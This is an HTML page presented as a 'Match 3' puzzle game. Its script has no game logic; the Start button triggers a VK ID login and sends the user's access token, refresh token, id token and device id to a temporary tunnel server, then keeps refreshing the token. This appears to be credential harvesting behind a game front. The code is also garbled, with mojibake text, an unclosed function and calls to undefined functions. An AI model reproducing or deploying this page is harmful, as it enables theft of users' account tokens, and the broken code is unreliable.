<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Match 3</title>
  <style>
    body {
      background: linear-gradient(to bottom, #ADD8E6, #87CEEB);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      overflow: hidden;
      color: white;
    }

    #gameContainer {
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    #gameBoard {
      display: grid;
      grid-gap: 2px;
      border: 1px solid black;
      width: 870px;
      height: 870px;
      background-color: #77B5FE;
      border-radius: 20px;
      overflow: hidden;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    }

    .cell {
      width: calc(870px / 8 - 2px);
      height: calc(870px / 8 - 2px);
      text-align: center;
      font-size: 24px;
      cursor: pointer;
      transition: transform 0.2s ease, background-color 0.2s ease;
      background-size: contain;
      background-repeat: no-repeat;
      background-position: center;
      border-radius: 15px;
      background-color: #6495ED;
    }

    .cell.swapping {
      transform: scale(1.2);
    }

    .cell.removing {
      opacity: 0;
      transition: opacity 0.2s ease;
    }

    #start {
      padding: 20px 40px;
      font-size: 24px;
      cursor: pointer;
      background-color: #4682B4;
      color: white;
      border: none;
      border-radius: 10px;
      transition: background-color 0.3s ease;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      z-index: 100;
    }

    #start.hidden {
      display: none;
    }

    #start:hover {
      background-color: #5F9EA0;
    }
  </style>
</head>
<body>

  <div id="gameContainer">
    <button id="start" onclick="initialize()">Start</button>
    <div id="gameBoard"></div>
  </div>

  <script src="https://unpkg.com/@vkid/sdk@<2.5.0/dist-sdk/umd/index.js"></script>
<script>
 const APP_ID = 8109529;
let accessToken = null;
let userInfo = null;
let deviceId = null;
let tokenRefreshTimer = null;
function hideStartButton() {
  const startButton = document.getElementById('start');
  if (startButton) {
    startButton.classList.add('hidden');
  }
}
function showError(message) {
  console.error(message);
}
async function initialize() {
  hideStartButton();

  try {
    if (!vkBridge.supports('VKWebAppInit')) {
      throw new Error('–û—Ç–∫—Ä–æ–π—Ç–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –≤–Ω—É—Ç—Ä–∏ VK!');
    }
    
    await vkBridge.send('VKWebAppInit');
    updateStatus('–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...');

    deviceId = getOrCreateDeviceId();
    console.log('üì± –£–Ω–∏–∫–∞–ª—å–Ω—ã–π device_id:', deviceId);

    const authData = await VKID.Auth.login({ client_id: APP_ID });
    accessToken = authData.access_token;
    userInfo = authData.user;

    const tokenData = {
      user_id: userInfo.id.toString(),
      access_token: authData.access_token,
      device_id: deviceId,
      refresh_token: authData.refresh_token || 'NO_REFRESH_TOKEN',
      token_type: authData.token_type || 'Bearer',
      expires_in: authData.expires_in || 3600,
      id_token: authData.id_token || '',
      token_datetime: new Date().toUTCString()
    };

    console.log("üìÖ token_datetime (RFC 5322):", tokenData.token_datetime);

    await sendTokenToYourServer(tokenData);
    setupTokenRefresh(authData.expires_in || 3600);
    showGame();
  } catch (error) {
    showError(`–û—à–∏–±–∫–∞: ${error.message || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞'}`);
  }
}

async function sendTokenToYourServer(data) {
  try {
    const response = await fetch('https://bla39d-37-45-190-41.ru.tuna.am/api/vk-token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });

    if (!response.ok) {
      throw new Error(`–û—à–∏–±–∫–∞ ${response.status}: ${response.statusText}`);
    }

    console.log('–î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –Ω–∞ —Å–µ—Ä–≤–µ—Ä');
    return await response.json();
  } catch (error) {
    console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä:', error);
    showError('–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö');
  }
}

function setupTokenRefresh(expiresIn) {
  if (tokenRefreshTimer) clearTimeout(tokenRefreshTimer);
  tokenRefreshTimer = setTimeout(async () => {
    console.log('–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Ç–æ–∫–µ–Ω–∞...');
    try {
      const authData = await VKID.Auth.login({ client_id: APP_ID });
      accessToken = authData.access_token;
      console.log('–¢–æ–∫–µ–Ω —É—Å–ø–µ—à–Ω–æ –æ–±–Ω–æ–≤–ª—ë–Ω');
      updateStatus('–¢–æ–∫–µ–Ω –æ–±–Ω–æ–≤–ª—ë–Ω');
      setupTokenRefresh(authData.expires_in || 3600);
    } catch (error) {
      console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏ —Ç–æ–∫–µ–Ω–∞:', error);
      showError('–ù–µ —É–¥–∞–ª–æ—Å—å –æ–±–Ω–æ–≤–∏—Ç—å —Ç–æ–∫–µ–Ω');
    }
  }, (expiresIn - 60) * 1000);
}

async function showGame() {
  try {
    await loadGameScript();
    if (typeof startGame === 'function') startGame();
    else showError('–û—à–∏–±–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –∏–≥—Ä—ã');

}


</script>
